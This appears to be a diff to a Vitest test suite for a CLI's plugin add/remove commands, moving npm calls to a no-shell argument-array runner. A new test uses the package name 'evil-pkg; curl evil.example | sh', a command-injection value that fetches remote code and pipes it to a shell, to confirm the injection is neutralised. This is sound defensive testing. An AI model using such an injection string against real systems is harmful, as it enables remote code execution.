@@ -6,6 +6,7 @@ vi.mock("../../lib/config.js", () => ({
 
 vi.mock("../../lib/exec.js", () => ({
   run: vi.fn(),
+  runFile: vi.fn(),
 }));
 
 vi.mock("../../lib/output.js", () => ({
@@ -30,7 +31,7 @@ vi.mock("../../lib/plugin-validator.js", () => ({
   validatePluginExport: vi.fn(),
 }));
 
-import { run } from "../../lib/exec.js";
+import { run, runFile } from "../../lib/exec.js";
 import { success, error as logError, warn, info } from "../../lib/output.js";
 import {
   readManifest,
@@ -45,6 +46,7 @@ import {
 } from "../../commands/plugin.js";
 
 const mockRun = vi.mocked(run);
+const mockRunFile = vi.mocked(runFile);
 const mockSuccess = vi.mocked(success);
 const mockError = vi.mocked(logError);
 const mockWarn = vi.mocked(warn);
@@ -94,8 +96,8 @@ describe("runPluginAdd", () => {
 
     await runPluginAdd(CHART_PKG);
 
-    // npm install + codegen invoked
-    expect(mockRun).toHaveBeenCalledWith("npm install " + CHART_PKG, {
+    // npm install (no-shell, arg array) + codegen invoked
+    expect(mockRunFile).toHaveBeenCalledWith("npm", ["install", CHART_PKG], {
       cwd: "/project",
     });
     expect(mockRun).toHaveBeenCalledWith(
@@ -112,6 +114,31 @@ describe("runPluginAdd", () => {
 
     expect(mockSuccess).toHaveBeenCalled();
     expect(process.exitCode).toBe(0);
+  });
+
+  it("passes a shell-metachar package name as a single argv element — no injection (#HIGH)", async () => {
+    mockValidate.mockReturnValue({
+      valid: true,
+      errors: [],
+      pluginType: "chart",
+    });
+    const EVIL = "evil-pkg; curl evil.example | sh";
+    vi.doMock(EVIL, () => ({
+      default: {
+        type: "x",
+        label: "x",
+        compatibleWith: ["neo4j"],
+        transform: () => ({}),
+      },
+    }));
+
+    await runPluginAdd(EVIL);
+
+    // The whole string is ONE argv element — a shell never sees it, so the
+    // `;` and `|` can't execute anything.
+    expect(mockRunFile).toHaveBeenCalledWith("npm", ["install", EVIL], {
+      cwd: "/project",
+    });
   });
 
   it("registers a connector plugin under connectors manifest + connector codegen", async () => {
@@ -187,7 +214,7 @@ describe("runPluginAdd", () => {
   });
 
   it("rolls back (uninstalls) and exits 1 when npm install fails", async () => {
-    mockRun.mockImplementationOnce(() => {
+    mockRunFile.mockImplementationOnce(() => {
       throw new Error("npm install failed");
     });
 
@@ -208,8 +235,9 @@ describe("runPluginAdd", () => {
     expect(mockError).toHaveBeenCalledWith(
       expect.stringContaining("Failed to import " + BROKEN_PKG),
     );
-    expect(mockRun).toHaveBeenCalledWith(
-      expect.stringContaining("npm uninstall " + BROKEN_PKG),
+    expect(mockRunFile).toHaveBeenCalledWith(
+      "npm",
+      ["uninstall", BROKEN_PKG],
       expect.any(Object),
     );
     expect(mockAddToManifest).not.toHaveBeenCalled();
@@ -255,12 +283,11 @@ describe("runPluginAdd", () => {
       errors: [],
       pluginType: "chart",
     });
-    // First call (npm install) OK, second (codegen) throws
-    mockRun
-      .mockImplementationOnce(() => "")
-      .mockImplementationOnce(() => {
-        throw new Error("codegen broke");
-      });
+    // npm install (runFile) OK; codegen (run) throws
+    mockRunFile.mockReturnValue("");
+    mockRun.mockImplementationOnce(() => {
+      throw new Error("codegen broke");
+    });
 
     await runPluginAdd(CHART_PKG);
 
@@ -324,7 +351,7 @@ describe("runPluginRemove", () => {
       "node scripts/generate-plugin-imports.mjs",
       { cwd: "/project" },
     );
-    expect(mockRun).toHaveBeenCalledWith("npm uninstall " + CHART_PKG, {
+    expect(mockRunFile).toHaveBeenCalledWith("npm", ["uninstall", CHART_PKG], {
       cwd: "/project",
     });
     expect(mockSuccess).toHaveBeenCalled();
@@ -360,12 +387,11 @@ describe("runPluginRemove", () => {
 
   it("warns but still succeeds when npm uninstall fails after manifest removal", async () => {
     mockRemoveFromManifest.mockReturnValueOnce(true);
-    // First run = codegen OK; second run (npm uninstall) throws
-    mockRun
-      .mockImplementationOnce(() => "")
-      .mockImplementationOnce(() => {
-        throw new Error("npm uninstall failed");
-      });
+    // codegen (run) OK; npm uninstall (runFile) throws
+    mockRun.mockReturnValue("");
+    mockRunFile.mockImplementationOnce(() => {
+      throw new Error("npm uninstall failed");
+    });
 
     await runPluginRemove(CHART_PKG);
 
